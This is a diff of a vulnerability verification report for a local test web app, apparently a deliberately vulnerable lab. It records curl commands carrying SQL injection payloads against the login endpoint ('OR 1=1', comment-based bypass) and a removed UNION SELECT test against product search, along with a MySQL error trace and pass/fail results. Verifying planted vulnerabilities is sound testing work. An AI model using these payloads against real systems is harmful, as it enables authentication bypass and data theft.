@@ -1,34 +1,28 @@
 ========================================
 VULNERABILITY VERIFICATION REPORT
-Generated: Sat Jun 27 11:19:08 CEST 2026
+Generated: Sat Jun 27 12:32:44 CEST 2026
 Target: http://localhost:8470
 ========================================
 
 
-\033[0;32m\033[0;34m========================================\033[0m
-\033[0;32mSQL INJECTION TESTS\033[0m
-\033[0;32m\033[0;34m========================================\033[0m
+\033[0;32m========================================\033[0m
+\033[0;32m[1] SQL INJECTION - LOGIN BYPASS\033[0m
+\033[0;32m========================================\033[0m
 
 \033[0;34m========================================\033[0m
 \033[0;34mTesting VULN-SQLI-001: Login SQL Injection Bypass\033[0m
-\033[1;33mDescription: Tests for SQL injection in login form allowing authentication bypass\033[0m
+\033[1;33mDescription: Tests SQL injection login bypass with payload: admin@example.local -- \033[0m
 
 \033[1;33mCommand:\033[0m
-  curl -s -X POST http://localhost:8470/api/auth/login.php -H 'Content-Type: application/json' -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"x"}'
+  curl -s -X POST http://localhost:8470/api/auth/login.php -H 'Content-Type: application/json' -d '{"username":"admin'\'' --","password":"x"}'
 
 \033[1;33mResult:\033[0m
-  {"success":false,"message":"Invalid credentials"}
+  <br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x'' at line 1 in /var/www/html/config/database.php:21
+Stack trace:
+#0 /var/www/html/config/database.php(21): mysqli_query(Object(mysqli), 'SELECT * FROM u...')
+#1 /var/www/html/api/auth/login.php(27): query('SELECT * FROM u...')
+#2 {main}
+  thrown in <b>/var/www/html/config/database.php</b> on line <b>21</b><br />
 
-\033[0;32m✅ VULN-SQLI-001: WORKS (vulnerable endpoint responding)\033[0m
-
-\033[0;34m========================================\033[0m
-\033[0;34mTesting VULN-SQLI-002: Product Search SQL Injection\033[0m
-\033[1;33mDescription: Tests for SQL injection in product search parameter\033[0m
-
-\033[1;33mCommand:\033[0m
-  curl -s 'http://localhost:8470/api/products/search?q=test'\'' UNION SELECT 1,2,3,4,5,6,7,8--'
-
-\033[1;33mResult:\033[0m
-  
-
-\033[0;31m❌ VULN-SQLI-002: FAIL (endpoint not responding as expected)\033[0m
+\033[0;31m[FAIL] VULN-SQLI-001: FAIL (endpoint not responding as expected)\033[0m
